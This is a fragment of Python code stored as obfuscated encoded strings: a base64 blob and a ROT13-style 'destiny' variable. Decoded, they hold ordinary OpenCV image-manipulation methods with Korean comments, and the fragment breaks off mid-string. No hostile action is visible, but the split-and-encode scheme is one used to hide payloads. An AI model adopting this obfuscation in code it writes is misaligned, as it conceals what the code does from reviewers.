iIKICAgICAgICDtiKzrqoUg7J2066+47KeAKEJHUkEp66W8IOyYpOuyhOugiOydtCDtlZzri6QuCiAgICAgICAgOnBhcmFtIG92ZXJsYXk6IO2IrOuqhSBJbWFnZSAoQkdSQSkKICAgICAgICA6cGFyYW0gcG9zOiAg7JyE7LmYLgogICAgICAgIDpwYXJhbSBzY2FsZSA6IOyKpOy8gOydvC4KICAgICAgICA6cmV0dXJuOiBJbWFnZQogICAgICAgICIiIgogICAgICAgIHNyYyA9IG5wLmNvcHkoc2VsZi5fX2ZyYW1lKQogICAgICAgIG92ZXJsYXkgPSBjdjIucmVzaXplKG92ZXJsYXksICgwLCAwKSwgZng9c2NhbGUsIGZ5PXNjYWxlKQogICAgICAgIGgsIHcsIF8gPSBvdmVybGF5LnNoYXBlICAjIFNpemUgb2YgZm9yZWdyb3VuZAogICAgICAgIHJvd3MsIGNvbHMsIF8gPSBzcmMuc2hhcGUgICMgU2l6ZSBvZiBiYWNrZ3JvdW5kIEltYWdlCiAgICAgICAgeSwgeCA9IHBvc1swXSwgcG9zWzFdICAjIFBvc2l0aW9uIG9mIGZvcmVncm91bmQvb3ZlcmxheSBpbWFnZQoKICAgICAgICAjIGxvb3Agb3ZlciBhbGwgcGl4ZWxzIGFuZCBhcHBseSB0aGUgYmxlbmRpbmcgZXF1YXRpb24KICAgICAgICBmb3IgaSBpbiByYW5nZShoKToKICAgICAgICAgICAgZm9yIGogaW4gcmFuZ2Uodyk6CiAgICAgICAgICAgICAgICBpZiB4ICsgaSA+PSByb3dzIG9yIHkgKyBqID49IGNvbHM6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgIGFscGhhID0gZmxvYXQob3ZlcmxheVtpXVtqXVszXSAvIDI1NS4wKSAgIyByZWFkIHRoZSBhbHBoYSBjaGFubmVsCiAgICAgICAgICAgICAgICBzcmNbeCArIGldW3kgKyBqXSA9ICgKICAgICAgICAgICAgICAgICAgICBhbHBoYSAqIG92ZXJsYXlbaV1bal1bOjNdICsgKDEgLSBhbHBoYSkgKiBzcmNbeCArIGldW3kgKyBqXQogICAgICAgICAgICAgICAgKQogICAgICAgIHJldHVybiBzcmMKCiAgICBkZWYgYmxlbmQoc2VsZiwgaW1nLCB3ZWlnaHQpOgogICAgICAgIGZyYW1lID0gY3YyLmFkZFdlaWdodGVkKHNlbGYuX19mcmFtZSwgMSAtIHdlaWdodCwgaW1nLmZyYW1lLCB3ZWlnaHQsIDApCiAgICAgICAgcmV0dXJuIEltYWdlKGZyYW1lKQoKICAgIGRlZiBibHVyKHNlbGYsIHgsIHksIHcsIGgsIGtzaXplPTMwKToKICAgICAgICBmcmFtZSA9IG5wLmNvcHkoc2VsZi5fX2ZyYW1lKQogICAgICAgIGlmIHcgPiAwIGFuZCBoID4gMDoKICAgICAgICAgICAgcm9pID0gZnJhbWVbeSA6IHkgKyBoLCB4IDogeCArIHddCiAgICAgICAgICAgIHJvaSA9IGN2Mi5ibHVyKHJvaSwgKGtzaXplLCBrc2l6ZSkpCiAgICAgICAgICAgIGZyYW1lW3kgOiB5ICsgaCwgeCA6IHggKyB3XSA9IHJvaQogICAgICAgIHJldHVybiBJbWFnZShmcmFtZSwgc2VsZi5fX2NvbG9yU3BhY2UpCgogICAgIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgICMgIHN0YXRpYyBtZXRob2QKICAgIEBjbGFzc21ldGhvZAogICAgZGVmIG1lcmdlKGNscywgYiwgZywgcik6CiAgICAgICAgZnJhbWUgPSBjdjIubWVyZ2UoKGIuZnJhbWUsIGcuZnJhbWUsIHIuZnJhbWUpKQogICAgICAgIHJldHVybiBJbWFnZShmcmFtZSwgQ29sb3JTcGFjZS5CR1IpCgogICAgQGNsYXNzbWV0aG9kCiAgICBkZWYgZnJvbV91cmwoY2xzLCB1cmwpOgogICAgICAgIHJlc3AgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybCkKICAgICAgICBpbWcgPSBucC5hc2FycmF5KGJ5dGVhcnJheShyZXNwLnJlYWQoKSksIGR0eXBlPSJ1aW50OCIpCiAgICAgICAgc2VsZi5pbWFnZSA9IGN2Mi5pbWRlY29kZShpbWcsIGN2Mi5JTVJFQURfVU5DSEFOR0VEKQogICAgICAgIHJldHVybiBzZWxmCgogICAgQGNsYXNzbWV0aG9kCiAgICBkZWYgZnJvbV9maWxlKGNscywgcGF0aD1Ob25lKToKICAgICAgICBpZiBwYXRoIGlzIE5vbmU6CiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgcmV0dXJuIGNscy5sb2FkX2ltYWdlKHBhdGgpCgogICAgQGNsYXNzbWV0aG9kCiAgICBkZWYgbG9hZChjbHMsIGZpbGVuYW1lKToKICAgICAgICBpZiByZS5tYXRjaChyIlx3KzovLyIsIGZpbGVuYW1lKToKICAgICAgICAgICAgd2l0aCB1cmxsaWIucmVxdWVzdC51cmxvcGVuKGZpbGVuYW1lKSBhcyB1cmw6CiAgICAgICAgICAgICAgICBmID0gaW8uQnl0ZXNJTyh1cmwucmVhZCgpKQogICAgICAgICAgICAgICAgcGlsX2ltYWdlID0gUEltYWdlLm9wZW4oZikKICAgICAgICBlbHNlOgogICAgICAgICAgICAjIO2VnOq4gCDtjIzsnbzrqoXsnbQg7J6I7Jy866m0IGN2Mi5pbXJlYWTripQg66q7IOydveyWtOuTpOyduOuLpC7qt7jrnpjshJwgUEltYWdlCiAgICAgICAgICAgIHBpbF9pbWFnZSA9IFBJbWFnZS5vcGVuKGZpbGVuYW1lKQoKICAgICAgICBmcmFtZSA9IGN2Mi5jdnRDb2xvcihucC5hcnJheShwaWxfaW1hZ2UpLCBjdjIuQ09MT1JfUkdCMkJHUikKICAgICAgICByZXR1cm4gSW1hZ2UoZnJhbWUpLnNldF9maWxlbmFtZShmaWxlbmFtZSkKCiAgICBAY2xhc3NtZXRob2QKICAgIGRlZiBvcGVuKGNscywgZmlsZW5hbWUpOgogICAgICAgIHJldHVybiBjbHMubG9hZChmaWxlbmFtZSkKCiAgICBAY2xhc3NtZXRob2QKICAgIGRlZiBjb25jYXRlbmF0ZShjbHMsIGltZzEsIGltZzIsIGF4aXM9ImgiKToKICAgICAgICAiIiIKICAgICAgICAnaCcgOiBob3Jpem9udGFsCiAgICAgICAgJ3YnIDogdmVydGljYWwKICAgICAgICAiIiIKICAgICAgICBpZiBheGlzID09ICJ2IjoKICAgICAgICAgICAgYXhpcyA9IDAKICAgICAgICBlbHNlOgogICAgICAgICAgICBheGlzID0gMQogICAgICAgIGZyYW1lID0gbnAuY29uY2F0ZW5hdGUoKGltZzEuZnJhbWUsIGltZzIuZnJhbWUpLCBheGlzPWF4aXMpCiAgICAgICAgcmV0dXJuIEltYWdlKGZyYW1lKQoKICAgIGRlZiBib3VuZGluZ19yZWN0KHNlbGYsIGNudHMsIGRyYXc9RmFsc2UpOgogICAgICAgICIiIkNvbnRvdXJz7J2YIOyYgeyXreydhCDtj6ztlajtlZjripQg7LWc7IaM7J2YIOyYgeyXreydhCDqtaztlZzri6QuCgogICAgICAgIEFyZ3M6CiAgICAgICAgICAgIGNudHMgKGxpc3QpOiBDb250b3Vyc+ydmCDrpqzsiqTtirgKCiAgICAgICAgUmV0dXJuczoKICAgICAgICAgICAgbGlzdDog67CU7Jq065SpIOuwleyKpCDrpqzsiqTtirggKHgxLCB5MSwgeDIsIHkyKQogICAgICAgICIiIgogICAgICAgICMgaHR0cDovL2xhYnMuZWVjcy50b3R0b3JpLXUuYWMuanAvc2QvTWVtYmVyL295YW1hZGEvT3BlbkNWL2h0bWwvcHlfdHV0b3JpYWxzL3B5X2ltZ3Byb2MvcHlfY29udG91cnMvcHlfY29udG91cl9mZWF0dXJlcy9weV9jb250b3VyX2ZlYXR1cmVzLmh0bWwKCiAgICAgICAgIyBodHRwczovL3dlYm5hdXRlcy50aXN0b3J5LmNvbS8xMjcwCiAgICAgICAgZnJhbWUgPSBzZWxmLl9fZnJhbWUuY29weSgpCiAgICAgICAgcmVjdHMgPSBbXQogICAgICAgIGZvciBpIGluIHJhbmdlKDAsIGxlbihjbnRzKSk6CiAgICAgICAgICAgIGlmIGxlbihjbnRzW2ldKSA+IDA6CiAgICAgICAgICAgICAgICB4LCB5LCB3LCBoID0gY3YyLmJvdW5kaW5nUmVjdChjbnRzW2ldKQogICAgICAgICAgICAgICAgcmVjdHMuYXBwZW5kKFt4LCB5LCB4ICsgdywgeSArIGhdKQoKICAgICAgICBpZiBkcmF3OgogICAgICAgICAgICBmb3IgYmIgaW4gcmVjdHM6CiAgICAgICAgICAgICAgICAoeDEsIHkxLCB4MiwgeTIpID0gYmIKICAgICAgICAgICAgICAgIGZyYW1lID0gY3YyLnJlY3RhbmdsZShmcmFtZSwgKHgxLCB5MSksICh4MiwgeTIpLCAoMCwgMjU1LCAwKSwgMSkKICAgICAgICAgICAgc2VsZi5fX2ZyYW1lID0gZnJhbWUKICAgICAgICByZXR1cm4gcmVjdHMKCiAgICBAY2xhc3NtZXRob2QKICAgIGRlZiBlbXB0eShjbHMsIHNpemUsIGNvbG9yPUNvbG9yLkRFRkFVTFQsIHdpZHRoPTAsIGhlaWdodD0wKToKICAgICAgICAiIiLsp4DsoJXtlZwg7YGs6riw7J2YIOydtOuvuOyngOulvCDrp4zrk6Dri6QuCgogICAgICAgIEFyZ3M6CiAgICAgICAgICAgIHNpemUgKHR1cGxlKTogKHcsIGgpCiAgICAgICAgICAgIHdlaWdodCAoaW50KTog7J2066+47KeA7J2YIOuEk+ydtAogICAgICAgICAgICBoZWlnaHQgKGludCk6IOydtOuvuOyngOydmCDrhpLsnbQKICAgICAgICAgICAgY29sb3IgKHR1cGxlKTogKHIsIGcsIGIpIOqwkgoKICAgICAgICBSZXR1cm5zOgogICAgICAgICAgICBJbWFnZTog66eM65Ok7Ja07KeEIOydtOuvuOyngCDqsJ3ssrQKICAgICAgICAiIiIKICAgICAgICBpZiBzaXplIGFuZCBpc2luc3RhbmNlKHNpemUsIHR1cGxlKToKICAgICAgICAgICAgd2lkdGgsIGhlaWdodCA9IHNpemUKICAgICAgICBpZiB3aWR0aCA9PSAwIG9yIGhlaWdodCA9PSAwOgogICAgICAgICAgICBoZWlnaHQgPSBidWlsdGlucy5IRUlHSFQKICAgICAgICAgICAgd2lkdGggPSBidWlsdGlucy5XSURUSAogICAgICAgIGZyYW1lID0gbnAuemVyb3MoKGhlaWdodCwgd2lkdGgsIDMpLCBucC51aW50OCkKICAgICAgICBmcmFtZVs6LCA6XSA9IGNvbG9yWzo6LTFdCiAgICAgICAgcmV0dXJuIEltYWdlKGZyYW1lKQoKICAgIEBjbGFzc21ldGhvZAogICAgZGVmIGZyb21hcnJheShjbHMsIGFyciwgY29sb3JzcGFjZT1Db2xvclNwYWNlLkJHUik6CiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoYXJyLCBucC5uZGFycmF5KToKICAgICAgICAgICAgYXJyID0gbnAuYXJyYXkoYXJyLCBkdHlwZT0idWludDgiKQoKICAgICAgICBpZiBsZW4oYXJyLnNoYXBlKSA9PSAyOgogICAgICAgICAgICByZXR1cm4gSW1hZ2UoYXJyLCBDb2xvclNwYWNlLkdSQVkpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIEltYWdlKGFyciwgY29sb3JzcGFjZSkKCiAgICBkZWYgZW1wdHlfbGlrZShzZWxmLCBjb2xvcj0oMjU1LCAyNTUsIDI1NSkpOgogICAgICAgICIiIuydtOuvuOyngOyZgCDqsJnsnYAg7LCo7JuQKHNoYXBlKeydmCDso7zslrTsp4Qg7IOJ7IOB7J2YIOydtOuvuOyngCDrp4zrk6Dri6QuCgogICAgICAgIEFyZ3M6CiAgICAgICAgICAgIGNvbG9yICh0dXBsZSwgb3B0aW9uYWwpOiAociwgZywgYinqsJIuIERlZmF1bHRzIHRvICgyNTUsIDI1NSwgMjU1KS4KCiAgICAgICAgUmV0dXJuczoKICAgICAgICAgICAgSW1hZ2U6IOunjOuTpOyWtOynhCDsnbTrr7jsp4Ag6rCd7LK0CiAgICAgICAgIiIiCiAgICAgICAgZnJhbWUgPSBucC56ZXJvcyhzZWxmLl9fZnJhbWUuc2hhcGUsIG5wLnVpbnQ4KQogICAgICAgIHJldHVybiBJbWFnZShmcmFtZSkKCiAgICBkZWYgYmFja2dyb3VuZChzZWxmLCBjb2xvcik6CiAgICAgICAgIiIi7J2066+47KeAIOyghOyytOulvCDso7zslrTsp4Qg7IOJ7IOB7Jy866GcIOuwlOq+vOuLpAoKICAgICAgICBBcmdzOgogICAgICAgICAgICBjb2xvciAodHVwbGUpOiAociwgZywgYikg7IOJ7IOB6rCSCgogICAgICAgIFJldHVybnM6CiAgICAgICAgICAgIEltYWdlOiDrp4zrk6TslrTsp4Qg7J2066+47KeAIOqwneyytAogICAgICAgICIiIgogICAgICAgIGZyYW1lID0gc2VsZi5fX2ZyYW1lLmNvcHkoKQogICAgICAgIGZyYW1lWzosIDpdID0gY29sb3JbOjotMV0KICAgICAgICByZXR1cm4gSW1hZ2UoZnJhbWUpCgogICAgZGVmIF9faXNfbnVtYmVyKHNlbGYsIHZhbHVlKToKICAgICAgICBpZiBpc2luc3RhbmNlKHZhbHVlLCBpbnQpIG9yIGlzaW5zdGFuY2UodmFsdWUsIGZsb2F0KToKICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICBlbHNlOgogICAgICAgICAgICByZXR1cm4gRmFsc2UKCiAgICAjCiAgICAjIGh0dHBzOi8vZG9jcy5weXRob24ub3JnL2tvLzMuNy9saWJyYXJ5L29wZXJhdG9yLmh0bWwKICAgICMKICAgIGRlZiBwaXhlbChzZWxmLCB4PTAsIHk9MCk6CiAgICAgICAgIiIiCiAgICAgICAgcmV0dXJuIChyLCBnLCBiKQogICAgICAgICIiIgogICAgICAgIHBpeGVsID0gc2VsZi5fX2ZyYW1lW3ksIHhdCiAgICAgICAgcGl4ZWwgPSBwaXhlbC50b2xpc3QoKQogICAgICAgIGlmIHNlbGYuX19jb2xvclNwYWNlID09IENvbG9yU3BhY2UuQkdSOgogICAgICAgICAgICBwaXhlbCA9IHBpeGVsWzo6LTFdICAjIGJnci0gPiByZ2IKICAgICAgICByZXR1cm4gdHVwbGUocGl4ZWwpCgogICAgIyBpbWdbOiw6LDo6LTFdIGJyZyAtPiByZ2IsCiAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwgY29vcmQpOgogICAgICAgICIiIgogICAgICAgIGNvb3JkIGlzICh4LCB5KQogICAgICAgICIiIgogICAgICAgICMgY29vcmQgLT4gKHgsIHkpCgogICAgICAgIHgsIHkgPSBjb29yZAogICAgICAgIGlmIGlzaW5zdGFuY2UoeCwgaW50KSBhbmQgaXNpbnN0YW5jZSh5LCBpbnQpOgogICAgICAgICAgICByZXR1cm4gc2VsZi5waXhlbCh4LCB5KQogICAgICAgIGVsaWYgaXNpbnN0YW5jZSh4LCBzbGljZSkgYW5kIGlzaW5zdGFuY2UoeSwgc2xpY2UpOgogICAgICAgICAgICBwaXhlbCA9IHNlbGYuX19mcmFtZVt5LCB4XQogICAgICAgICAgICByZXR1cm4gSW1hZ2UocGl4ZWwpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmV0dXJuIE5vbmUKCiAgICBkZWYgX19zZXRpdGVtX18oc2VsZiwgY29vcmQsIHZhbHVlKToKICAgICAgICAiIiIKICAgICAgICBjb29yZCAgaXMgKHgsIHkpCiAgICAgICAgdmFsdWUgaXMgKHIsIGcsIGIpCiAgICAgICAgIiIiCiAgICAgICAgIyBjb29yZCAtPiAoeCwgeSkKICAgICAgICB4LCB5ID0gY29vcmQKICAgICAgICBpZiBzZWxmLl9fY29sb3JTcGFjZSA9PSBDb2xvclNwYWNlLlJHQjoKICAgICAgICAgICAgc2VsZi5fX2ltYWdlWyh5LCB4KV0gPSB2YWx1ZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHNlbGYuX19pbWFnZVsoeSwgeCldID0gdmFsdWVbOjotMV0KCiAgICBkZWYgX19ib29sX18oc2VsZik6CiAgICAgICAgaWYgaXNpbnN0YW5jZShzZWxmLmltYWdlLCBucC5uZGFycmF5KToKICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICByZXR1cm4gRmFsc2UKCiAgICBkZWYgX19yZXByX18oc2VsZik6CiAgICAgICAgcmV0dXJuIGYiPEhlbGxvQUkuSW1hZ2UgT2JqZWN0IFNoYXBlOntzZWxmLl9fZnJhbWUuc2hhcGV9LCBDb2xvcjooe3NlbGYuX19jb2xvclNwYWNlfSkgLGF0IG1lbW9yeSBsb2NhdGlvbjogKHtoZXgoaWQoc2VsZikpfSk+IgoKICAgIGRlZiBfX2FkZF9fKHNlbGYsIG90aGVyKToKICAgICAgICBzZWxmX2ZyYW1lID0gc2VsZi5fX2ZyYW1lCiAgICAgICAgb3RoZXJfZnJhbWUgPSBvdGhlci5mcmFtZQoKICAgICAgICBpZiBzZWxmLl9faXNfbnVtYmVyKG90aGVyKToKICAgICAgICAgICAgb3RoZXIgPSBjdjIuYWRkKHNlbGYuX19mcmFtZSwgb3RoZXIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgIyBpZiBsZW4oc2VsZl9mcmFtZS5zaGFwZSkgPT0gMjoKICAgICAgICAgICAgIyAgICAgc2VsZl9mcmFtZSA9IGN2Mi5jdnRDb2xvcihzZWxmX2ZyYW1lLCBjdjIuQ09MT1JfR1JBWTJCR1IpCiAgICAgICAgICAgICMgaWYgbGVuKG90aGVyX2ZyYW1lLnNoYXBlKSA9PSAyOgogICAgICAgICAgICAjICAgICBvdGhlcl9mcmFtZSA9IGN2Mi5jdnRDb2xvcihvdGhlcl9mcmFtZSwgY3YyLkNPTE9SX0dSQVkyQkdSKQogICAgICAgICAgICAjIHByaW50KCdAQEAgc2VsZi5fX2ZyYW1lJywgc2VsZl9mcmFtZS5zaGFwZSkKICAgICAgICAgICAgIyBwcmludCgnQEBAIG90aGVyLmZyYW1lJywgb3RoZXJfZnJhbWUuc2hhcGUpCiAgICAgICAgICAgIGlmIGxlbihzZWxmX2ZyYW1lLnNoYXBlKSAhPSBsZW4ob3RoZXJfZnJhbWUuc2hhcGUpOgogICAgICAgICAgICAgICAgcHJpbnQoIuuRkCDsnbTrr7jsp4DsnZgg7Lus65+sIOyxhOuEkOydtCDri6TrpoXri4jri6QiKQogICAgICAgICAgICAgICAgcmV0dXJuIE5vbmUKCiAgICAgICAgICAgIG90aGVyID0gY3YyLmFkZChzZWxmX2ZyYW1lLCBvdGhlcl9mcmFtZSkKICAgICAgICByZXR1cm4gSW1hZ2Uob3RoZXIsIENvbG9yU3BhY2UuQkdSKQoKICAgIGRlZiBkaWZmKHNlbGYsIGltZyk6CgogICAgICAgIGZyYW1lID0gc2VsZi5fX2ZyYW1lLmNvcHkoKQogICAgICAgIG90aGVyID0gaW1nLmZyYW1lLmNvcHkoKQogICAgICAgIGRpZmYgPSBjdjIuYWJzZGlmZihmcmFtZSwgb3RoZXIpCiAgICAgICAgZ3JheSA9IGN2Mi5jdnRDb2xvcihkaWZmLCBjdjIuQ09MT1JfQkdSMkdSQVkpCiAgICAgICAgYmx1ciA9IGN2Mi5HYXVzc2lhbkJsdXIoZ3JheSwgKDUsIDUpLCAwKQogICAgICAgIF8sIHRocmVzaCA9IGN2Mi50aHJlc2hvbGQoYmx1ciwgMjAsIDI1NSwgY3YyLlRIUkVTSF9CSU5BUlkpCiAgICAgICAgZGlsYXRlZCA9IGN2Mi5kaWxhdGUodGhyZXNoLCBOb25lLCBpdGVyYXRpb25zPTMpCgogICAgICAgIHJldHVybiBJbWFnZShkaWxhdGVkLCBDb2xvclNwYWNlLkdSQVkpCgogICAgZGVmIF9fc3ViX18oc2VsZiwgb3RoZXIpOgogICAgICAgIGlmIHNlbGYuX19pc19udW1iZXIob3RoZXIpOgogICAgICAgICAgICBvdGhlciA9IGN2Mi5zdWJ0cmFjdChzZWxmLl9fZnJhbWUsIG90aGVyKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgICMgaWYgc2VsZi5fX2NvbG9yU3BhY2UgIT0gb3RoZXIuY29sb3JzcGFjZToKICAgICAgICAgICAgIyAgICAgcmV0dXJuIE5vbmUKICAgICAgICAgICAgb3RoZXIgPSBjdjIuc3VidHJhY3Qoc2VsZi5fX2ZyYW1lLCBvdGhlci5mcmFtZSkKICAgICAgICByZXR1cm4gSW1hZ2Uob3RoZXIpCgogICAgZGVmIF9fZGl2X18oc2VsZiwgb3RoZXIpOgoKICAgICAgICBpZiBzZWxmLl9faXNfbnVtYmVyKG90aGVyKToKICAgICAgICAgICAgb3RoZXIgPSBjdjIuZGl2aWRlKHNlbGYuX19mcmFtZSwgb3RoZXIpCiAgICAgICAgcmV0dXJuIEltYWdlKG90aGVyKQoKICAgIGRlZiBfX3RydWVkaXZfXyhzZWxmLCBvdGhlcik6CiAgICAgICAgaWYgc2VsZi5fX2lzX251bWJlcihvdGhlcik6CiAgICAgICAgICAgIG90aGVyID0gY3YyLmRpdmlkZShzZWxmLl9fZnJhbWUsIG90aGVyKQogICAgICAgICAgICBvdGhlciA9IG90aGVyLmFzdHlwZShucC51aW50OCkKICAgICAgICByZXR1cm4gSW1hZ2Uob3RoZXIpCgogICAgZGVmIF9fZmxvb3JkaXZfXyhzZWxmLCBvdGhlcik6CiAgICAgICAgaWYgc2VsZi5fX2lzX251bWJlcihvdGhlcik6CiAgICAgICAgICAgIG90aGVyID0gY3YyLmRpdmlkZShzZWxmLl9fZnJhbWUsIG90aGVyKQogICAgICAgICAgICBvdGhlciA9IG90aGVyLmFzdHlwZShucC51aW50OCkKICAgICAgICByZXR1cm4gSW1hZ2Uob3RoZXIpCgogICAgZGVmIF9fbXVsX18oc2VsZiwgb3RoZXIpOgogICAgICAgIGlmIHNlbGYuX19pc19udW1iZXIob3RoZXIpOgogICAgICAgICAgICBvdGhlciA9IGN2Mi5tdWx0aXBseShzZWxmLl9fZnJhbWUsIG90aGVyKQogICAgICAgIHJldHVybiBJbWFnZShvdGhlcikKCiAgICBkZWYgX19uZWdfXyhzZWxmKToKICAgICAgICAiIiIKICAgICAgICAtb2JqCiAgICAgICAgIiIiCiAgICAgICAgcmV0dXJuIHNlbGYuaW52ZXJ0KCkKCiAgICBkZWYgX19pbnZlcnRfXyhzZWxmKToKICAgICAgICAiIiIKICAgICAgICB+b2JqCiAgICAgICAgIiIiCiAgICAgICAgcmV0dXJuIHNlbGYuaW52ZXJ0KCkKCiAgICAjIOydjC4uLuygnOuMgOuhnCDrj5nsnpHtlZjsp4Ag7JWK64qU64ukLi4KICAgICMgIEJMT0IoQmluYXJ5IExhcmdlIE9iamVjdCnripQg7J207KeEIOyKpOy8gOydvOuhnCDsl7DqsrDrkJwg7ZS97IWAIOq3uOujueydhCDrp5Dtlanri4jri6QKICAgIGRlZiBfX2ZpbmRfYmxvYnMoc2VsZiwgbWluX2FyZWE9MjAwLCBkcmF3PUZhbHNlKToKICAgICAgICBmcmFtZSA9IG5wLmNvcHkoc2VsZi5fX2ZyYW1lKQogICAgICAgIHByaW50KCJfX2NvbG9yU3BhY2UgIiwgc2VsZi5fX2NvbG9yU3BhY2UpCiAgICAgICAgaWYgc2VsZi5fX2NvbG9yU3BhY2UgPT0gQ29sb3JTcGFjZS5CR1I6CiAgICAgICAgICAgIGdyYXkgPSBjdjIuY3Z0Q29sb3IoZnJhbWUsIGN2Mi5DT0xPUl9CR1IyR1JBWSkKICAgICAgICBlbGlmIHNlbGYuX19jb2xvclNwYWNlID09IENvbG9yU3BhY2UuUkdCOgogICAgICAgICAgICBncmF5ID0gY3YyLmN2dENvbG9yKGZyYW1lLCBjdjIuQ09MT1JfUkdCMkdSQVkpCiAgICAgICAgZWxpZiBzZWxmLl9fY29sb3JTcGFjZSA9PSBDb2xvclNwYWNlLkdSQVk6CiAgICAgICAgICAgIGdyYXkgPSBmcmFtZQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybgoKICAgICAgICBjdjIuaW1zaG93KCJibG9iIiwgZ3JheSkKCiAgICAgICAgIyBibG9iIOqygOy2nCDtlYTthLAg7YyM652866+47YSwIOyDneyEsQogICAgICAgIHBhcmFtcyA9IGN2Mi5TaW1wbGVCbG9iRGV0ZWN0b3JfUGFyYW1zKCkKCiAgICAgICAgIyDqsr3qs4TqsJIg7KGw7KCVCiAgICAgICAgcGFyYW1zLm1pblRocmVzaG9sZCA9IDEwCiAgICAgICAgcGFyYW1zLm1heFRocmVzaG9sZCA9IDI0MAogICAgICAgIHBhcmFtcy50aHJlc2hvbGRTdGVwID0gNQogICAgICAgICMg66m07KCBIO2VhO2EsCDsvJzqs6Ag7LWc7IaMIOqwkiDsp4DsoJUKICAgICAgICBwYXJhbXMuZmlsdGVyQnlBcmVhID0gVHJ1ZQogICAgICAgIHBhcmFtcy5taW5BcmVhID0gbWluX2FyZWEKCiAgICAgICAgIyDsu6zrn6wsIOuzvOuhnSDruYTsnKgsIOybkO2Yleu5hOycqCDtlYTthLAg7Ji17IWYIOuBhOq4sAogICAgICAgIHBhcmFtcy5maWx0ZXJCeUNvbG9yID0gRmFsc2UKICAgICAgICBwYXJhbXMuZmlsdGVyQnlDb252ZXhpdHkgPSBGYWxzZQogICAgICAgIHBhcmFtcy5maWx0ZXJCeUluZXJ0aWEgPSBGYWxzZQogICAgICAgIHBhcmFtcy5maWx0ZXJCeUNpcmN1bGFyaXR5ID0gRmFsc2UKCiAgICAgICAgIyDtlYTthLAg7YyM652866+47YSw66GcIGJsb2Ig6rKA7Lac6riwIOyDneyEsQogICAgICAgIGRldGVjdG9yID0gY3YyLlNpbXBsZUJsb2JEZXRlY3Rvcl9jcmVhdGUocGFyYW1zKQogICAgICAgICMg7YKkIO2PrOyduO2KuCDqsoDstpwKICAgICAgICBrZXlwb2ludHMgPSBkZXRlY3Rvci5kZXRlY3QoZ3JheSkKICAgICAgICBwcmludCgia2V5cG9pbnRzICIsIGtleXBvaW50cykKICAgICAgICAjIO2CpCDtj6zsnbjtirgg6re466as6riwCiAgICAgICAgaWYgZHJhdzoKICAgICAgICAgICAgZnJhbWUgPSBjdjIuZHJhd0tleXBvaW50cygKICAgICAgICAgICAgICAgIGZyYW1lLCBrZXlwb2ludHMsIE5vbmUsIE5vbmUsIGN2Mi5EUkFXX01BVENIRVNfRkxBR1NfRFJBV19SSUNIX0tFWVBPSU5UUwogICAgICAgICAgICApCgogICAgICAgICMg6rKw6rO8IOy2nOugpQogICAgICAgIHJldHVybiBJbWFnZShmcmFtZSwgc2VsZi5fX2NvbG9yU3BhY2UpLCBrZXlwb2ludHMKCiAgICAjIGh0dHBzOi8vanZ2cC50aXN0b3J5LmNvbS8xMDgxCiAgICBkZWYgZXJvZGUoc2VsZiwga2VybmVsc2l6ZT0zLCBpdGVyYXRpb25zPTEpOgogICAgICAgIGtlcm5lbCA9IHt9CiAgICAgICAga2VybmVsWzBdID0gY3YyLmdldFN0cnVjdHVyaW5nRWxlbWVudChjdjIuTU9SUEhfUkVDVCwgKGtlcm5lbHNpemUsIGtlcm5lbHNpemUpKQogICAgICAgIGtlcm5lbFsxXSA9IGN2Mi5nZXRTdHJ1Y3R1cmluZ0VsZW1lbnQoY3YyLk1PUlBIX0NST1NTLCAoa2VybmVsc2l6ZSwga2VybmVsc2l6ZSkpCiAgICAgICAga2VybmVsWzJdID0gY3YyLmdldFN0cnVjdHVyaW5nRWxlbWVudCgKICAgICAgICAgICAgY3YyLk1PUlBIX0VMTElQU0UsIChrZXJuZWxzaXplLCBrZX'
-destiny = 'WhMJkmnKcyXDbtVPNtVPNtVPxXPvNtVPNtVPNtnJLtp2IfMv5sK2AioT9lH3OuL2HtVG0tD29fo3WGpTSwMF5UHxSMBtbtVPNtVPNtVPNtVPOlMKE1pz4tGz9hMDbXVPNtVPNtVPOzpzSgMFN9VTA2Zv5ypz9xMFuzpzSgMFjtn2IlozIfJmOqYPOcqTIlLKEco25mCJy0MKWuqTyioaZcPvNtVPNtVPNtpzI0qKWhVRygLJqyXTMlLJ1yYPOQo2kipyAjLJAyYxqFDIxcPtbtVPNtVlObqUEjpmbiY2c2qaNhqTymqT9lrF5wo20iZGN4ZDbtVPNtMTIzVTEcoTS0MFumMJkzYPOeMKWhMJkmnKcyCGZfVTy0MKWuqTyioaZ9ZFx6PvNtVPNtVPNtn2IlozIfVQ0tr30XVPNtVPNtVPOeMKWhMJkoZS0tCFOwqwVhM2I0H3ElqJA0qKWcozqSoTIgMJ50XTA2Zv5AG1WDFS9FEHAHYPNbn2IlozIfp2y6MFjtn2IlozIfp2y6MFxcPvNtVPNtVPNtn2IlozIfJmSqVQ0tL3LlYzqyqSA0paIwqUIlnJ5aEJkyoJIhqPuwqwVhGH9FHRusD1WCH1ZfVPueMKWhMJkmnKcyYPOeMKWhMJkmnKcyXFxXVPNtVPNtVPOeMKWhMJkoZy0tCFOwqwVhM2I0H3ElqJA0qKWcozqSoTIgMJ50XNbtVPNtVPNtVPNtVPOwqwVhGH9FHRusEHkZFIOGEFjtXTgypz5yoUAcrzHfVTgypz5yoUAcrzHcPvNtVPNtVPNtXDbXVPNtVPNtVPOcMvOmMJkzYy9sL29fo3WGpTSwMFNuCFOQo2kipyAjLJAyYxqFDIx6PvNtVPNtVPNtVPNtVUWyqUIlovOBo25yPtbtVPNtVPNtVTMlLJ1yVQ0tL3LlYzEcoTS0MFuzpzSgMFjtn2IlozIfJmOqYPOcqTIlLKEco25mCJy0MKWuqTyioaZcPvNtVPN